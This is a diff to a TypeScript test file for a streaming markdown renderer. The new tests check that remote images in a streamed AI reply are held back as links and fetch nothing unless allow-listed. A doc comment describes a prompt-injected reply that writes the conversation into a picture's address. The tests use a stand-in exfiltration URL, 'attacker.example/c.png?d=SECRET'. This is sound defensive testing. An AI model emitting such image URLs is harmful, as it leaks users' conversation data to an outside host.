@@ -138,11 +138,116 @@ describe('@aparte/plugin-streaming-markdown — external links while the message
     });
 
     it('does not touch an image', () => {
+        aparteGlobalConfig.setImagePolicy(['https://example.com']);
+        try {
+            const target = document.createElement('div');
+            streamInto(target, ['![alt](https://example.com/a.png)']);
+            const img = target.querySelector('img');
+            expect(img?.getAttribute('src')).toBe('https://example.com/a.png');
+            expect(img?.getAttribute('target')).toBeNull();
+        } finally {
+            aparteGlobalConfig.setImagePolicy([]);
+        }
+    });
+});
+
+/**
+ * A picture is a request the moment its `src` is set, and the parser sets it on a node that
+ * is already in the reply — before the reply ends, before any sanitizer. So the image policy
+ * has to hold here, not only at the settle: a prompt-injected reply that writes the
+ * conversation into a picture's address must fetch nothing while it streams.
+ */
+describe('@aparte/plugin-streaming-markdown — a picture while the message streams', () => {
+    const ATTACKER = 'https://attacker.example/c.png?d=SECRET';
+
+    beforeEach(() => {
+        setupStreamingMarkdownProvider();
+    });
+    afterEach(() => {
+        aparteGlobalConfig.setImagePolicy([]);
+    });
+
+    /** Every remote address an `<img>` of the live document was given while `run` ran. */
+    function remoteSrcsDuring(target: HTMLElement, run: () => void): string[] {
+        const seen: string[] = [];
+        const setAttribute = Element.prototype.setAttribute;
+        Element.prototype.setAttribute = function (this: Element, name: string, value: string) {
+            if (this.ownerDocument === document && this.tagName === 'IMG' && /^(src|srcset)$/i.test(name)) seen.push(value);
+            return setAttribute.call(this, name, value);
+        };
+        const observer = new MutationObserver(() => {});
+        observer.observe(target, { childList: true, subtree: true });
+        try {
+            run();
+        } finally {
+            Element.prototype.setAttribute = setAttribute;
+        }
+        for (const record of observer.takeRecords()) {
+            for (const node of record.addedNodes) {
+                if (!(node instanceof Element)) continue;
+                for (const img of [node, ...node.querySelectorAll('img')]) {
+                    if (img.tagName === 'IMG' && img.getAttribute('src')) seen.push(img.getAttribute('src')!);
+                }
+            }
+        }
+        observer.disconnect();
+        return seen.filter((src) => /^https?:|^\/\//i.test(src));
+    }
+
+    it('fetches nothing for a remote picture, and draws the link that loads it', () => {
         const target = document.createElement('div');
-        streamInto(target, ['![alt](https://example.com/a.png)']);
-        const img = target.querySelector('img');
-        expect(img?.getAttribute('src')).toBe('https://example.com/a.png');
-        expect(img?.getAttribute('target')).toBeNull();
+        document.body.append(target);
+        const r = aparteGlobalConfig.createStreamingMarkdownRenderer(target)!;
+        const remote = remoteSrcsDuring(target, () => {
+            for (const chunk of ['Here is ', '![sales ', 'chart](https://attacker.', 'example/c.png?d=SECRET', ') and more']) r.write(chunk);
+            r.end();
+        });
+        expect(remote).toEqual([]);
+        const link = target.querySelector('a.aparte-image-held')!;
+        expect(link.getAttribute('data-aparte-image')).toBe(ATTACKER);
+        expect(link.getAttribute('data-aparte-image-alt')).toBe('sales chart');
+        expect(target.textContent).toContain('and more');
+        target.remove();
+    });
+
+    it('fetches nothing either when a complete reply renders through it', () => {
+        const target = document.createElement('div');
+        const remote = remoteSrcsDuring(target, () => {
+            target.innerHTML = aparteGlobalConfig.renderMarkdown(`![x](${ATTACKER})`);
+        });
+        expect(remote).toEqual([]);
+        expect(target.querySelector('img')).toBeNull();
+        expect(target.querySelector('a.aparte-image-held')).not.toBeNull();
+    });
+
+    it('loads an allowed picture with its description and no referrer', () => {
+        aparteGlobalConfig.setImagePolicy(['https://cdn.example.com']);
+        const target = document.createElement('div');
+        const r = aparteGlobalConfig.createStreamingMarkdownRenderer(target)!;
+        r.write('![a cat](https://cdn.example.com/cat.png)');
+        r.end();
+        const img = target.querySelector('img')!;
+        expect(img.getAttribute('src')).toBe('https://cdn.example.com/cat.png');
+        expect(img.getAttribute('alt')).toBe('a cat');
+        expect(img.getAttribute('referrerpolicy')).toBe('no-referrer');
+    });
+
+    it('loads a data: picture, which makes no request', () => {
+        const target = document.createElement('div');
+        const r = aparteGlobalConfig.createStreamingMarkdownRenderer(target)!;
+        r.write('![dot](data:image/png;base64,iVBORw0KGgo=)');
+        r.end();
+        expect(target.querySelector('img')?.getAttribute('src')).toBe('data:image/png;base64,iVBORw0KGgo=');
+    });
+
+    it('draws the same link again when the settle re-sanitises what it wrote', () => {
+        const target = document.createElement('div');
+        const r = aparteGlobalConfig.createStreamingMarkdownRenderer(target)!;
+        r.write(`![x](${ATTACKER})`);
+        r.end();
+        const settled = document.createElement('div');
+        settled.innerHTML = aparteGlobalConfig.sanitizeHtml(target.innerHTML);
+        expect(settled.innerHTML).toBe(target.innerHTML);
     });
 });
 
